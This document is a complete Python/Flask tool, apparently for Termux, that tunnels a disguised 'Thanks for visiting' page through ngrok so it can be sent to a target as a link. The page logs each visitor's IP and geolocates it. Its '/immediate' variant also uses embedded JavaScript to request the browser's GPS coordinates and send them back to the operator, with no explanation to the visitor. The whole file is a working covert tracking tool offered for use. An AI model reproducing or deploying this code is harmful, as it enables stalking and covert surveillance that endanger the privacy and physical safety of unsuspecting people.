import requests
import datetime
import os
import time
import subprocess
import socket
from flask import Flask, request, render_template_string
from threading import Thread

app = Flask(__name__)
PORT = None

HTML_BASIC = """
<!doctype html>
<html><head><title>Welcome</title></head>
<body><h2>Thanks for visiting</h2><p>Your IP has been logged.</p></body>
</html>
"""

HTML_IMMEDIATE = """
<!DOCTYPE html>
<html>
<head>
  <title>Accurate Location Tracker</title>
</head>
<body>
  <h2>Thanks for visiting!</h2>
  <p>Your IP has been logged.</p>
  <script>
    fetch("/log_ip", {method: "POST"}).catch(() => {});
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        function(position) {
          fetch("/submit_location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy
            })
          }).catch(() => {});
        }
      );
    }
  </script>
</body>
</html>
"""

def banner():
    print("\033[92m" + """
╔════════════════════════════════════════════╗
║     Made by Mohimanul-TVM (Free Version)  ║
╚════════════════════════════════════════════╝
""" + "\033[0m")

def get_location(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = res.json()
        if data["status"] == "success":
            return {
                "IP": ip,
                "City": data.get("city"),
                "Region": data.get("regionName"),
                "Country": data.get("country"),
                "Latitude": data.get("lat"),
                "Longitude": data.get("lon"),
                "ISP": data.get("isp"),
                "Map": f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}",
                "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
    except Exception as e:
        return {"IP": ip, "Error": str(e)}
    return {"IP": ip, "Error": "Unknown error"}

@app.route('/')
def index():
    return render_template_string(HTML_BASIC)

@app.route('/log_ip', methods=["POST"])
def log_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    data = get_location(ip)
    print("\n--- Immediate IP Captured ---")
    for k, v in data.items():
        print(f"{k}: {v}")
    print("----------------------------\n")
    return "IP logged"

@app.route('/submit_location', methods=["POST"])
def submit_location():
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    accuracy = data.get("accuracy")

    result = {
        "method": "GPS",
        "Latitude": lat,
        "Longitude": lon,
        "Accuracy (m)": accuracy,
        "Map": f"https://www.google.com/maps?q={lat},{lon}",
        "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    print("\n--- Accurate Location Captured (GPS) ---")
    for k, v in result.items():
        print(f"{k}: {v}")
    print("----------------------------------------\n")

    return "Location received!"

@app.route('/immediate')
def immediate():
    return render_template_string(HTML_IMMEDIATE)

def find_free_port():
    with socket.socket() as s:
        s.bind(('', 0))
        return s.getsockname()[1]

def download_ngrok():
    if not os.path.isfile("ngrok"):
        print("\033[93m[•] Downloading ngrok...\033[0m")
        os.system("pkg install -y wget unzip")
        os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip")
        os.system("unzip ngrok.zip && rm ngrok.zip && chmod +x ngrok")

def start_ngrok():
    global PORT
    PORT = find_free_port()
    download_ngrok()
    token = input("Enter your Ngrok Authtoken (required once): ").strip()
    os.system(f"./ngrok authtoken {token}")
    cmd = ["./ngrok", "http", str(PORT)]
    print("\033[93m[•] Starting Ngrok tunnel...\033[0m")
    ngrok_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)
    try:
        tunnels = requests.get("http://127.0.0.1:4040/api/tunnels").json()
        public_url = tunnels['tunnels'][0]['public_url']
        print(f"\033[92m[✓] Ngrok public URL: {public_url}\033[0m")
        return ngrok_process, public_url
    except Exception as e:
        print(f"\033[91m[✗] Failed to get ngrok URL: {e}\033[0m")
        ngrok_process.terminate()
        return None, None

def run_flask():
    app.run(host="0.0.0.0", port=PORT)

def ip_lookup():
    ip = input("Enter target IP address: ").strip()
    data = get_location(ip)
    print("\n\033[96m--- IP Info ---\033[0m")
    for k, v in data.items():
        print(f"{k}: {v}")
    print("\033[96m----------------\033[0m")

def generate_link():
    ngrok_process, url = start_ngrok()
    if not url:
        return
    flask_thread = Thread(target=run_flask)
    flask_thread.start()
    print(f"\033[93m[•] Share this link: {url}/\033[0m")
    try:
        while flask_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nTerminating...")
        ngrok_process.terminate()
        flask_thread.join()

def immediate_ip_gps_option():
    ngrok_process, url = start_ngrok()
    if not url:
        return
    flask_thread = Thread(target=run_flask)
    flask_thread.start()
    print(f"\033[93m[•] Share this link: {url}/immediate\033[0m")
    try:
        while flask_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nTerminating...")
        ngrok_process.terminate()
        flask_thread.join()

def menu():
    banner()
    while True:
        print("\n\033[93m[1]\033[0m Track location using IP")
        print("\033[93m[2]\033[0m Generate link & capture visitor IP (basic page)")
        print("\033[93m[3]\033[0m Generate link & capture visitor IP immediately + GPS (advanced)")
        print("\033[93m[0]\033[0m Exit")
        choice = input("Select an option: ").strip()
        if choice == '1':
            ip_lookup()
        elif choice == '2':
            generate_link()
        elif choice == '3':
            immediate_ip_gps_option()
        elif choice == '0':
            print("Exiting...")
            break
        else:
            print("Invalid option.")

if __name__ == '__main__':
    try:
        menu()
    except Exception as e:
        print(f"\033[91m[✗] Error: {e}\033[0m")
